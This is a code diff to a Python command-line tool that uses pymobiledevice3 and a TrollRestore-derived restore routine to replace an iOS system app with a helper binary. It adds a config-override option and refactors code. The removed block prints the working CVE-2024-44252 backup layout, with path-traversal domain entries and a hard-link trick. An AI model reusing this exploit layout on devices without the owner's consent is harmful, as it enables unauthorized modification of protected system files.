@@ -27,18 +27,19 @@ from pymobiledevice3.services.diagnostics import DiagnosticsService
 from pymobiledevice3.services.installation_proxy import InstallationProxyService
 
 from sparserestore import backup, perform_restore
+from _payload import build_backup_files
 
 PAYLOAD_PATH = Path(__file__).resolve().parent / "payload" / "PersistenceHelper_Embedded"
-MXCONFIG_PATH = Path(__file__).resolve().parent.parent / "mxhelper" / "mxconfig.plist"
+DEFAULT_MXCONFIG_PATH = Path(__file__).resolve().parent.parent / "mxhelper" / "mxconfig.plist"
 
 
-def _read_app_urls() -> list[tuple[str, str]]:
-    """Return [(name, url), ...] from mxhelper/mxconfig.plist. Supports both
-    the new `Apps` array format and the legacy single `IPAURL` field."""
-    if not MXCONFIG_PATH.exists():
+def _read_app_urls(config_path: Path = DEFAULT_MXCONFIG_PATH) -> list[tuple[str, str]]:
+    """Return [(name, url), ...] from a plist file. Supports both the new
+    `Apps` array format and the legacy single `IPAURL` field."""
+    if not config_path.exists():
         return []
     try:
-        with open(MXCONFIG_PATH, "rb") as f:
+        with open(config_path, "rb") as f:
             cfg = plistlib.load(f)
     except Exception:
         return []
@@ -58,12 +59,16 @@ def _read_app_urls() -> list[tuple[str, str]]:
     return out
 
 
-def _print_post_install_url(progress: bool) -> None:
+# build_backup_files lives in _payload.py so mxrestore-gui can import the same
+# function without dragging in click / pymobiledevice3 CLI dependencies.
+
+
+def _print_post_install_url(progress: bool, config_path: Path = DEFAULT_MXCONFIG_PATH) -> None:
     """After TrollRestore succeeds, surface the apple-magnifier:// URLs that
     will install each configured IPA. Useful as a fallback when the helper
     binary is opa334's vanilla version (no MXAutoFlow); the CI-built version
     auto-installs and these URLs are redundant."""
-    apps = _read_app_urls()
+    apps = _read_app_urls(config_path)
     if not apps:
         return
     if progress:
@@ -101,12 +106,17 @@ def _exit(code=0):
 @click.command(cls=Command)
 @click.option("--system-app", "system_app",
               help="Removable system app to overwrite (e.g. Tips). If omitted, prompts interactively.")
+@click.option("--config", "config_path", type=click.Path(exists=True, dir_okay=False),
+              default=None,
+              help="Path to an mxconfig.plist override. If set, the file is pushed into the bundle "
+                   "(Tips.app/mxconfig.plist) and MXAutoFlow on device uses it instead of the "
+                   "compile-time embedded list. Omit to keep the embedded Apps list.")
 @click.option("--no-reboot", is_flag=True, default=False,
               help="Skip the post-restore reboot. The device will need a manual reboot to land the swapped binary.")
 @click.option("--json-progress", "json_progress", is_flag=True, default=False,
               help="Emit NDJSON progress on stdout (for GUI shells).")
 @click.pass_context
-def cli(ctx, service_provider: LockdownClient, system_app, no_reboot, json_progress) -> None:
+def cli(ctx, service_provider: LockdownClient, system_app, config_path, no_reboot, json_progress) -> None:
     os_names = {
         "iPhone": "iOS", "iPad": "iPadOS", "iPod": "iOS",
         "AppleTV": "tvOS", "Watch": "watchOS",
@@ -178,37 +188,29 @@ def cli(ctx, service_provider: LockdownClient, system_app, no_reboot, json_progr
         return
 
     app_uuid = app_path.parent.name
+
+    # Optional plist override: push it into the bundle so MXAutoFlow on device
+    # reads it via NSBundle and ignores the compile-time embedded section.
+    extra_files: list[tuple[str, bytes]] = []
+    effective_config = DEFAULT_MXCONFIG_PATH
+    if config_path:
+        effective_config = Path(config_path)
+        plist_bytes = effective_config.read_bytes()
+        extra_files.append(("mxconfig.plist", plist_bytes))
+        _emit(json_progress, _color="yellow",
+              msg=f"Will push mxconfig override: {effective_config} ({len(plist_bytes)} bytes)",
+              stage="config_override", path=str(effective_config), size=len(plist_bytes))
+
     _emit(json_progress, _color="yellow",
           msg=f"Replacing {system_app} with mxhelper. (UUID: {app_uuid})",
           stage="replacing", app=system_app, uuid=app_uuid)
 
-    # Backup payload (verbatim from upstream TrollRestore — this is the
-    # CVE-2024-44252 weaponized layout; do not touch).
-    back = backup.Backup(files=[
-        backup.Directory("", "RootDomain"),
-        backup.Directory("Library", "RootDomain"),
-        backup.Directory("Library/Preferences", "RootDomain"),
-        backup.ConcreteFile("Library/Preferences/temp", "RootDomain",
-                            owner=33, group=33, contents=helper_contents, inode=0),
-        backup.Directory(
-            "",
-            f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{system_app}",
-            owner=33, group=33,
-        ),
-        backup.ConcreteFile(
-            "",
-            f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{system_app}/{system_app.split('.')[0]}",
-            owner=33, group=33, contents=b"", inode=0,
-        ),
-        backup.ConcreteFile(
-            "",
-            "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
-            owner=501, group=501, contents=b"",
-        ),  # Break the hard link
-        backup.ConcreteFile("",
-            "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose",
-            contents=b""),
-    ])
+    back = backup.Backup(files=build_backup_files(
+        helper_contents=helper_contents,
+        app_uuid=app_uuid,
+        system_app=system_app,
+        extra_bundle_files=extra_files,
+    ))
 
     try:
         perform_restore(back, reboot=False)
@@ -225,7 +227,7 @@ def cli(ctx, service_provider: LockdownClient, system_app, no_reboot, json_progr
         _emit(json_progress, _color="green",
               msg="Restore done. Reboot the device manually to activate.",
               stage="restore_done", reboot_required=True)
-        _print_post_install_url(json_progress)
+        _print_post_install_url(json_progress, effective_config)
         return
 
     _emit(json_progress, _color="green",
